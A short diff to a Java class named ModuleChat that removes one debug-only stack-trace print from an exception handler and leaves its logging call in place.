@@ -126,7 +126,6 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		} catch (Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart), " + e);
-				e.printStackTrace();
 			}
 		}
 		ListenerProcess.self().attach(this);
